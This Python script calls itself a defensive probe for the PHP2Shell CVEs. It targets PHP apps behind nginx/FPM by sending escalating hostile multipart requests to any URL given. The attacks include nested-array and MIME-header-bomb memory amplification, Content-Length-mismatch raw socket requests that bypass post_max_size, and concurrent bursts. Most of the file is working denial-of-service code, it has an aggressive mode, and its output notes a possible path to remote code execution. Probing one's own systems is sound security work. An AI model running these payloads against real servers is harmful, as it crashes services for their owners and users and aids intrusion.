#!/usr/bin/env python3
"""
php2shell-probe.py — Defensive probe for CVE-2026-109618 / CVE-2026-109619
================================================================================

Generic probe against any PHP app behind nginx/FPM. Tests the actual attack
vectors from the PHP2Shell advisory.

Attack vectors tested:
  T1  Baseline health + normal POST control
  T2  Flat multipart amplification (many tiny parts)
  T3  Nested array amplification (each part → deep HashTable tree)
  T4  Upload_progress callback trigger (session init pressure)
  T5  Duplicate Content-Disposition headers (vuln stores all; fix deduplicates)
  T6  Content-Length mismatch (CL < body → post_max_size bypass)
  T9  MIME header bomb — THE actual PHP2Shell vector (fake headers in ONE part)
  T7  Concurrent amplification (parallel requests to stress FPM pool)
  T8  Cross-request state integrity (amplify → rapid sequential health checks)

Usage:
  # Minimal — just a URL:
  python3 -I php2shell-probe.py https://api-staging.example.com/

  # Full control:
  python3 -I php2shell-probe.py https://api-staging.example.com/ \\
      --health /up --nginx-max 14M --memory-limit 256M --aggressive

  # Dry run to see what would happen:
  python3 -I php2shell-probe.py https://example.com/api/endpoint --dry-run

  # Only run the MIME header bomb (the real vector):
  python3 -I php2shell-probe.py https://example.com/ --only t9
"""

import argparse
import concurrent.futures
import io
import os
import re
import socket
import ssl
import sys
import time
import uuid
from dataclasses import dataclass
from typing import Optional
from urllib.parse import urlparse

import requests


# ─── Configuration ───────────────────────────────────────────────────────────

@dataclass
class TargetConfig:
    name: str
    base_url: str
    post_endpoint: str
    health_path: str
    nginx_max_body: int
    memory_limit: int

    @property
    def post_url(self):
        return f"{self.base_url}{self.post_endpoint}"

    @property
    def health_url(self):
        return f"{self.base_url}{self.health_path}"


def parse_size(s):
    s = s.strip().upper()
    m = re.match(r'^(\d+(?:\.\d+)?)\s*(K|KB|M|MB|G|GB)?$', s)
    if not m:
        raise argparse.ArgumentTypeError(f"Invalid size: {s}")
    n = float(m.group(1))
    unit = (m.group(2) or "").rstrip("B")
    return int(n * {"": 1, "K": 1024, "M": 1024**2, "G": 1024**3}[unit])


# ─── Helpers ─────────────────────────────────────────────────────────────────

class C:
    OK = "\033[92m"; WARN = "\033[93m"; FAIL = "\033[91m"
    DIM = "\033[2m"; BOLD = "\033[1m"; END = "\033[0m"

def log(level, msg):
    c = {"info": C.DIM, "ok": C.OK, "warn": C.WARN, "fail": C.FAIL}.get(level, "")
    p = {"info": "·", "ok": "✓", "warn": "⚠", "fail": "✗"}.get(level, " ")
    print(f"  {c}{p}{C.END} {msg}")

def section(title):
    print(f"\n{C.BOLD}{'─' * 64}{C.END}")
    print(f"{C.BOLD}  {title}{C.END}")
    print(f"{C.BOLD}{'─' * 64}{C.END}")

def health_check(target, timeout=10):
    try:
        r = requests.get(target.health_url, timeout=timeout, allow_redirects=False)
        return r.status_code, r.elapsed.total_seconds()
    except requests.RequestException:
        return 0, 0.0


# ─── Payload builders ───────────────────────────────────────────────────────

def build_flat_multipart(num_parts, value_size=1):
    boundary = f"----Probe{uuid.uuid4().hex[:12]}"
    buf = io.BytesIO()
    val = b"x" * value_size
    for i in range(num_parts):
        buf.write(f"--{boundary}\r\n".encode())
        buf.write(f"Content-Disposition: form-data; name=\"p{i}\"\r\n".encode())
        buf.write(b"\r\n")
        buf.write(val)
        buf.write(b"\r\n")
    buf.write(f"--{boundary}--\r\n".encode())
    return buf.getvalue(), f"multipart/form-data; boundary={boundary}"


def build_nested_multipart(num_parts, depth=30):
    boundary = f"----Probe{uuid.uuid4().hex[:12]}"
    buf = io.BytesIO()
    for i in range(num_parts):
        keys = "".join(f"[{j}]" for j in range(depth))
        name = f"a{i}{keys}"
        buf.write(f"--{boundary}\r\n".encode())
        buf.write(f"Content-Disposition: form-data; name=\"{name}\"\r\n".encode())
        buf.write(b"\r\n")
        buf.write(b"x\r\n")
    buf.write(f"--{boundary}--\r\n".encode())
    return buf.getvalue(), f"multipart/form-data; boundary={boundary}"


def build_upload_progress_payload(num_files, file_size=1024, depth=0):
    boundary = f"----Probe{uuid.uuid4().hex[:12]}"
    buf = io.BytesIO()
    session_name = f"probe_{uuid.uuid4().hex[:8]}"
    buf.write(f"--{boundary}\r\n".encode())
    buf.write(b"Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n")
    buf.write(b"\r\n")
    buf.write(session_name.encode())
    buf.write(b"\r\n")
    for i in range(num_files):
        keys = "".join(f"[{j}]" for j in range(depth)) if depth else ""
        name = f"file{i}{keys}"
        buf.write(f"--{boundary}\r\n".encode())
        buf.write(f"Content-Disposition: form-data; name=\"{name}\"; filename=\"f{i}.bin\"\r\n".encode())
        buf.write(b"Content-Type: application/octet-stream\r\n")
        buf.write(b"\r\n")
        buf.write(b"\x00" * file_size)
        buf.write(b"\r\n")
    buf.write(f"--{boundary}--\r\n".encode())
    return buf.getvalue(), f"multipart/form-data; boundary={boundary}"


def build_dup_headers(num_dupes):
    boundary = f"----Probe{uuid.uuid4().hex[:12]}"
    buf = io.BytesIO()
    buf.write(f"--{boundary}\r\n".encode())
    for _ in range(num_dupes):
        buf.write(b"Content-Disposition: form-data; name=\"dup\"\r\n")
    buf.write(b"\r\n")
    buf.write(b"test\r\n")
    buf.write(f"--{boundary}--\r\n".encode())
    return buf.getvalue(), f"multipart/form-data; boundary={boundary}"


def build_mime_header_bomb(num_headers, header="X:y"):
    """
    ONE multipart part with many fake MIME headers.
    The actual PHP2Shell amplification vector from rfc1867.c.

    multipart_buffer_headers() stores ALL headers without limit:
      - estrdup(line) for the key (~48 bytes + key length)
      - smart_string_appends() for the value
      - zend_llist_add_element() for the list entry (~24 bytes)
    Total: ~268 bytes per header in PHP memory (empirically measured).

    The fix (8.3.36) adds php_mime_should_save_hdr() which whitelists only
    Content-Disposition and Content-Type, rejecting everything else.

    Amplification: 5 bytes on wire → ~268 bytes in PHP = ~53x
    """
    boundary = f"----Probe{uuid.uuid4().hex[:12]}"
    buf = io.BytesIO()
    buf.write(f"--{boundary}\r\n".encode())
    buf.write(b"Content-Disposition: form-data; name=\"a\"\r\n")
    header_line = f"{header}\r\n".encode()
    for _ in range(num_headers):
        buf.write(header_line)
    buf.write(b"\r\n")
    buf.write(b"test\r\n")
    buf.write(f"--{boundary}--\r\n".encode())
    return buf.getvalue(), f"multipart/form-data; boundary={boundary}"


# ─── Content-Length mismatch via raw socket ──────────────────────────────────

def send_cl_mismatch(host, port, path, body, claimed_cl, timeout=15):
    ctx = ssl.create_default_context()
    sock = socket.create_connection((host, port), timeout=timeout)
    ssock = ctx.wrap_socket(sock, server_hostname=host)
    boundary = f"----Probe{uuid.uuid4().hex[:12]}"
    ct = f"multipart/form-data; boundary={boundary}"
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: {ct}\r\n"
        f"Content-Length: {claimed_cl}\r\n"
        f"Accept: application/json\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body
    t0 = time.time()
    ssock.sendall(req)
    resp = b""
    try:
        while True:
            chunk = ssock.recv(4096)
            if not chunk:
                break
            resp += chunk
    except (socket.timeout, ssl.SSLError):
        pass
    elapsed = time.time() - t0
    ssock.close()
    status_match = re.search(rb'HTTP/\d\.\d (\d{3})', resp)
    code = int(status_match.group(1)) if status_match else 0
    return code, elapsed


# ─── Probe framework ────────────────────────────────────────────────────────

@dataclass
class ProbeResult:
    test_name: str
    body_size: int
    detail: str
    http_status: int
    response_time: float
    health_after: int
    health_time: float
    error: str = ""
    is_anomaly: bool = False

def send_probe(target, body, content_type, test_name, detail="",
               timeout=30, extra_headers=None):
    headers = {"Content-Type": content_type, "Accept": "application/json"}
    if extra_headers:
        headers.update(extra_headers)
    try:
        r = requests.post(target.post_url, data=body, headers=headers,
                          timeout=timeout, allow_redirects=False)
        status, elapsed, error = r.status_code, r.elapsed.total_seconds(), ""
    except requests.Timeout:
        status, elapsed, error = 0, timeout, "timeout"
    except requests.ConnectionError:
        status, elapsed, error = 0, 0, "conn error"

    time.sleep(0.3)
    h_status, h_time = health_check(target)
    is_anomaly = status >= 500 or status == 0 or h_status != 200 or elapsed > 10

    return ProbeResult(test_name=test_name, body_size=len(body), detail=detail,
                       http_status=status, response_time=elapsed,
                       health_after=h_status, health_time=h_time,
                       error=error, is_anomaly=is_anomaly)

def report(res):
    s = f"HTTP {res.http_status}" if res.http_status else res.error
    h = f"health={res.health_after}"
    level = "warn" if res.is_anomaly else "ok"
    extra = " ⚠ ANOMALY" if res.is_anomaly else ""
    log(level, f"{s} in {res.response_time:.3f}s | {h} | "
               f"{res.body_size:,} bytes{extra}")
    if res.detail:
        log("info", f"  {res.detail}")


# ─── Tests ───────────────────────────────────────────────────────────────────

def run_tests(target, dry_run=False, aggressive=False, only=None):
    results = []

    section(f"Target: {target.name} ({target.post_url})")
    log("info", f"nginx_max_body={target.nginx_max_body // 1024}K  "
                f"memory_limit={target.memory_limit // (1024*1024)}M")

    # ── T0: Baseline ─────────────────────────────────────────────────────
    section("T0: Baseline")
    h_status, h_time = health_check(target)
    if h_status == 0:
        log("fail", f"Health UNREACHABLE — skipping this target")
        return results
    log("ok", f"Health: HTTP {h_status} in {h_time:.3f}s")

    if dry_run:
        for t in ["T1", "T2", "T3", "T4", "T5", "T6", "T9", "T7", "T8"]:
            section(f"{t} (dry run)")
            log("info", "Would run — skipped")
        return results

    def should_run(tid):
        return only is None or tid in only

    # ── T1: Normal POST control ──────────────────────────────────────────
    if should_run("t1"):
        section("T1: Normal POST (control)")
        try:
            r = requests.post(target.post_url,
                              json={"probe": True},
                              headers={"Accept": "application/json"},
                              timeout=10)
            log("ok", f"HTTP {r.status_code} in {r.elapsed.total_seconds():.3f}s")
        except requests.RequestException as e:
            log("fail", f"Error: {e}")

    # ── T2: Flat multipart amplification ─────────────────────────────────
    if should_run("t2"):
        section("T2: Flat multipart amplification")
        log("info", "Many tiny parts → zval + HashTable overhead per part")
        overhead = 80
        max_parts = int(target.nginx_max_body * 0.90 / overhead)
        steps = sorted(set(
            s for s in [100, 500, 1000, 5000, 10000, 20000, min(50000, max_parts)]
            if s <= max_parts
        ))
        for np in steps:
            body, ct = build_flat_multipart(np)
            res = send_probe(target, body, ct, f"flat_{np}",
                             f"{np} parts, ~{np * 300 // 1024}KB in PHP (est. 300B/part)")
            results.append(res)
            report(res)
            if res.is_anomaly:
                break

    # ── T3: Nested array amplification ───────────────────────────────────
    if should_run("t3"):
        section("T3: Nested array amplification")
        log("info", "Each part creates a deep tree of HashTables in PHP.")
        depths = [20, 30]
        if aggressive:
            depths.append(50)
        for depth in depths:
            overhead = depth * 8 + 60
            max_parts = int(target.nginx_max_body * 0.90 / overhead)
            steps = sorted(set(
                s for s in [100, 500, 1000, 2000, 5000, 10000, 20000, min(40000, max_parts)]
                if s <= max_parts
            ))
            for np in steps:
                body, ct = build_nested_multipart(np, depth)
                if len(body) > target.nginx_max_body:
                    break
                est_php = np * depth * 200
                res = send_probe(target, body, ct, f"nested_{np}_d{depth}",
                                 f"{np} parts × depth {depth} → ~{est_php // 1024}KB in PHP (est.)")
                results.append(res)
                report(res)
                if res.is_anomaly:
                    break

    # ── T4: upload_progress ──────────────────────────────────────────────
    if should_run("t4"):
        section("T4: session.upload_progress callback trigger")
        log("info", "PHP_SESSION_UPLOAD_PROGRESS activates rfc1867_callback,")
        log("info", "which calls session_initialize + session_flush per update.")
        configs = [(10, 1024, 0), (50, 4096, 0), (10, 1024, 20),
                   (50, 2048, 15), (200, 4096, 0)]
        if aggressive:
            configs += [(100, 4096, 20), (500, 2048, 10),
                        (200, 8192, 15), (500, 8192, 10)]
        for nf, fs, d in configs:
            body, ct = build_upload_progress_payload(nf, fs, d)
            if len(body) > target.nginx_max_body:
                continue
            detail = f"{nf} files × {fs}B" + (f" × depth {d}" if d else "")
            res = send_probe(target, body, ct, f"upload_{nf}_{fs}_d{d}", detail)
            results.append(res)
            report(res)
            if res.is_anomaly:
                break

    # ── T5: Duplicate Content-Disposition headers ────────────────────────
    if should_run("t5"):
        section("T5: Duplicate Content-Disposition headers")
        log("info", "Fix deduplicates + whitelists headers; vuln stores them all.")
        for num in [10, 50, 200, 500]:
            body, ct = build_dup_headers(num)
            res = send_probe(target, body, ct, f"dup_{num}",
                             f"{num} duplicate headers")
            results.append(res)
            report(res)

    # ── T6: Content-Length mismatch ──────────────────────────────────────
    if should_run("t6"):
        section("T6: Content-Length mismatch (post_max_size bypass test)")
        log("info", "Send Content-Length smaller than actual body.")
        log("info", "If PHP processes fields beyond CL → fill_buffer bypass confirmed.")

        parsed = urlparse(target.base_url)
        host = parsed.hostname
        port = 443

        for claimed, actual_parts in [(100, 500), (100, 5000)]:
            probe_body, probe_ct = build_flat_multipart(actual_parts)
            actual_size = len(probe_body)
            boundary = re.search(r'boundary=(.+)', probe_ct).group(1)
            path = target.post_endpoint

            log("info", f"CL={claimed}, actual body={actual_size:,}B ({actual_parts} parts)")
            try:
                code, elapsed = send_cl_mismatch(host, port, path,
                                                 probe_body, claimed)
                if code in (200, 301, 302, 400, 405, 422):
                    log("warn", f"HTTP {code} in {elapsed:.3f}s — PHP processed "
                                f"the request despite CL={claimed} < body={actual_size:,}B")
                    log("warn", f"  → post_max_size bypass LIKELY EFFECTIVE")
                    results.append(ProbeResult(
                        test_name=f"cl_mismatch_{claimed}_{actual_parts}",
                        body_size=actual_size, detail="",
                        http_status=code, response_time=elapsed,
                        health_after=200, health_time=0,
                        is_anomaly=False))
                elif code == 413:
                    log("ok", f"HTTP 413 — nginx enforced body size (good)")
                else:
                    log("info", f"HTTP {code} in {elapsed:.3f}s")
            except Exception as e:
                log("fail", f"Socket error: {e}")

            time.sleep(0.5)

    # ── T9: MIME header bomb (the actual PHP2Shell vector) ───────────────
    if should_run("t9"):
        section("T9: MIME header amplification (the real PHP2Shell vector)")
        log("info", "ONE part with thousands of fake MIME headers (X:y).")
        log("info", "Vulnerable multipart_buffer_headers() stores ALL of them.")
        log("info", "5 bytes on wire → ~268 bytes in PHP = ~53x amplification.")
        oom_headers = target.memory_limit // 268
        wire_for_oom = oom_headers * 5
        log("info", f"OOM threshold est: ~{oom_headers:,} headers = "
                     f"~{wire_for_oom // (1024*1024)}MB on wire.")

        header_steps = [10000, 50000, 100000, 500000]
        if aggressive:
            header_steps += [1000000, 2000000, min(2800000, oom_headers)]

        for num_h in header_steps:
            body, ct = build_mime_header_bomb(num_h)
            if len(body) > target.nginx_max_body:
                log("info", f"Skipping {num_h:,} headers "
                            f"({len(body):,}B > nginx {target.nginx_max_body:,}B)")
                break

            est_php = num_h * 268
            est_pct = est_php * 100 // target.memory_limit
            log("info", f"Sending {num_h:,} headers ({len(body):,}B wire, "
                         f"~{est_php // (1024*1024)}MB / "
                         f"{target.memory_limit // (1024*1024)}MB "
                         f"in PHP [{est_pct}%])...")

            res = send_probe(target, body, ct, f"mime_bomb_{num_h}",
                             f"{num_h:,} fake headers → "
                             f"~{est_php // (1024*1024)}MB in PHP",
                             timeout=120)
            results.append(res)

            if res.http_status >= 500 or res.http_status == 0:
                log("fail", f"HTTP {res.http_status} in {res.response_time:.3f}s | "
                            f"health={res.health_after}")
                if res.http_status >= 500:
                    log("fail", "SERVER ERROR — OOM bailout!")
                if res.health_after != 200:
                    log("fail", "SERVICE DOWN after single request — OOM confirmed!")
                break
            else:
                report(res)

            time.sleep(1)

    # ── T7: Concurrent amplification ─────────────────────────────────────
    if should_run("t7"):
        section("T7: Concurrent amplification")
        log("info", "Send multiple amplification payloads in parallel to stress")
        log("info", "FPM worker pool and increase chance of OOM + worker reuse.")

        concurrency = 8 if aggressive else 3
        for np, nd in [(5000, 50), (2000, 50), (1000, 30), (200, 30), (100, 20)]:
            body, ct = build_nested_multipart(np, nd)
            if len(body) <= target.nginx_max_body:
                break

        log("info", f"{concurrency} concurrent requests, {len(body):,}B each")

        def fire_one(idx):
            try:
                t0 = time.time()
                r = requests.post(target.post_url,
                                  data=body,
                                  headers={"Content-Type": ct,
                                           "Accept": "application/json"},
                                  timeout=30)
                return idx, r.status_code, time.time() - t0
            except Exception:
                return idx, 0, time.time() - t0

        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as pool:
            futures = [pool.submit(fire_one, i) for i in range(concurrency)]
            for f in concurrent.futures.as_completed(futures):
                idx, code, elapsed = f.result()
                level = "ok" if code < 500 and code != 0 else "warn"
                log(level, f"  Worker {idx}: HTTP {code} in {elapsed:.3f}s")

        time.sleep(1)
        h_status, h_time = health_check(target)
        if h_status != 200:
            log("fail", f"Health FAILED after concurrent burst: {h_status}")
        else:
            log("ok", f"Health OK after concurrent burst: {h_status} ({h_time:.3f}s)")

    # ── T8: Cross-request state integrity ────────────────────────────────
    if should_run("t8"):
        section("T8: Cross-request state integrity")
        log("info", "Fire biggest payload, then 10 rapid GETs to detect")
        log("info", "corrupted state leaking into subsequent requests.")

        body, ct = build_nested_multipart(300, 30)
        if len(body) > target.nginx_max_body:
            body, ct = build_nested_multipart(100, 20)
        send_probe(target, body, ct, "state_prime", timeout=30)

        anomalies = 0
        for i in range(10):
            h_status, h_time = health_check(target, timeout=5)
            if h_status != 200 or h_time > 3:
                anomalies += 1
                log("warn", f"  Request {i+1}: HTTP {h_status} in {h_time:.3f}s")
            else:
                log("ok", f"  Request {i+1}: HTTP {h_status} in {h_time:.3f}s")
            time.sleep(0.1)

        if anomalies == 0:
            log("ok", "No cross-request state corruption detected")
        else:
            log("fail", f"{anomalies}/10 anomalies — possible state corruption!")

    return results


# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="PHP2Shell probe (CVE-2026-109618/109619)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://staging.example.com/
  %(prog)s https://staging.example.com/ --aggressive
  %(prog)s https://staging.example.com/ --health /up --nginx-max 14M
  %(prog)s https://staging.example.com/ --only t9
  %(prog)s https://staging.example.com/ --only t6,t9 --aggressive
        """)
    parser.add_argument("url", help="Target URL (base URL + POST endpoint)")
    parser.add_argument("--health", default="/up",
                        help="Health check path (default: /up)")
    parser.add_argument("--nginx-max", default="14M", type=parse_size,
                        help="nginx client_max_body_size (default: 14M)")
    parser.add_argument("--memory-limit", default="256M", type=parse_size,
                        help="PHP memory_limit (default: 256M)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Show plan without sending any payloads")
    parser.add_argument("--aggressive", action="store_true",
                        help="Deeper nesting, more concurrency, bigger payloads")
    parser.add_argument("--only", default=None,
                        help="Comma-separated list of tests to run (e.g. t6,t9)")
    args = parser.parse_args()

    parsed = urlparse(args.url)
    if not parsed.scheme:
        parsed = urlparse(f"https://{args.url}")
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    post_endpoint = parsed.path or "/"
    name = parsed.netloc

    target = TargetConfig(
        name=name,
        base_url=base_url,
        post_endpoint=post_endpoint,
        health_path=args.health,
        nginx_max_body=args.nginx_max,
        memory_limit=args.memory_limit,
    )

    only = None
    if args.only:
        only = set(t.strip().lower() for t in args.only.split(","))

    print(f"\n{C.BOLD}PHP2Shell Defensive Probe v4{C.END}")
    print(f"CVE-2026-109618 / CVE-2026-109619")
    print(f"{'=' * 64}")
    print(f"Time:   {time.strftime('%Y-%m-%d %H:%M:%S %Z')}")
    print(f"Target: {target.post_url}")
    print(f"Health: {target.health_url}")
    print(f"Limits: nginx={target.nginx_max_body // 1024}K  "
          f"memory={target.memory_limit // (1024*1024)}M")
    print(f"Mode:   {'AGGRESSIVE' if args.aggressive else 'standard'}"
          f"{' (DRY RUN)' if args.dry_run else ''}"
          f"{f' [only: {args.only}]' if args.only else ''}")

    results = run_tests(target, args.dry_run, args.aggressive, only)

    # ── Summary ──────────────────────────────────────────────────────────
    section("SUMMARY")
    if not results:
        log("info", "No test results")
        return

    anomalies = [r for r in results if r.is_anomaly]
    cl_bypasses = [r for r in results if r.test_name.startswith("cl_mismatch")
                   and r.http_status in (200, 301, 302, 400, 405, 422)]
    oom_hits = [r for r in results if r.test_name.startswith("mime_bomb")
                and r.http_status in (500, 502)]

    print()
    log("info" if not anomalies and not oom_hits else "fail",
        f"{C.BOLD}{target.name}{C.END}: {len(results)} tests, "
        f"{len(oom_hits)} OOM crashes, "
        f"{len(cl_bypasses)} CL-bypass confirmations, "
        f"{len(anomalies)} anomalies")

    if oom_hits:
        smallest = min(oom_hits, key=lambda r: r.body_size)
        log("fail", f"  OOM CONFIRMED via MIME header bomb — {len(oom_hits)} crash(es)")
        log("fail", f"  Smallest crashing payload: {smallest.test_name}")
        log("fail", f"  This confirms the zend_bailout() path (CVE-2026-109619)")
        log("fail", f"  With FPM worker reuse → UAF → RCE is theoretically reachable")

    if cl_bypasses:
        log("warn", f"  Content-Length bypass confirmed — PHP reads beyond CL")
        log("warn", f"  This is the entry point for post_max_size bypass (CVE-2026-109618)")

    if anomalies:
        for a in anomalies:
            log("warn", f"  {a.test_name}: HTTP {a.http_status} health={a.health_after}")
    elif not oom_hits:
        log("ok", f"  No 500s, no crashes, no health failures")

    # Timing analysis
    timed = [(r.test_name, r.response_time) for r in results
             if r.response_time > 0 and not r.test_name.startswith("cl_")]
    if timed:
        fastest = min(t for _, t in timed)
        slowest_name, slowest = max(timed, key=lambda x: x[1])
        if slowest > fastest * 3:
            log("warn", f"  Slowdown detected: {slowest_name} took {slowest:.3f}s "
                        f"vs baseline {fastest:.3f}s ({slowest/fastest:.1f}x)")

    # OOM threshold estimation
    mime_results = [r for r in results if r.test_name.startswith("mime_bomb")]
    survived = [r for r in mime_results if r.http_status not in (0, 500, 502)]
    crashed = [r for r in mime_results if r.http_status in (500, 502)]
    if survived and crashed:
        def extract_count(test_name):
            m = re.search(r'mime_bomb_(\d+)', test_name)
            return int(m.group(1)) if m else 0
        max_ok = max(extract_count(r.test_name) for r in survived)
        min_crash = min(extract_count(r.test_name) for r in crashed)
        est_bytes_per_hdr = target.memory_limit // min_crash if min_crash else 0
        log("info", f"  OOM threshold: between {max_ok:,} and {min_crash:,} headers")
        log("info", f"  Estimated overhead: ~{est_bytes_per_hdr} bytes/header "
                    f"(~{est_bytes_per_hdr // 5}x amplification)")

    print()
    log("info", "Interpretation:")
    if oom_hits:
        log("fail", "- OOM REACHED — FPM worker crashes on a single request.")
        log("fail", "  The zend_bailout() longjmp corrupts state → UAF chain is reachable.")
        wire_limit = min(r.body_size for r in survived) if survived else 0
        log("info", f"- Mitigation: lower nginx client_max_body_size below "
                    f"~{wire_limit // (1024*1024)}MB on routes that don't need uploads.")
    else:
        log("info", "- OOM threshold not reached with these payloads.")
        log("info", "  A real attacker may use larger bodies or different vectors.")
    if cl_bypasses:
        log("warn", "- CL-bypass = post_max_size bypass works (CVE-2026-109618).")
    log("info", "- The only confirmed fix is PHP 8.3.36 / 8.4.27.")
    print()


if __name__ == "__main__":
    main()
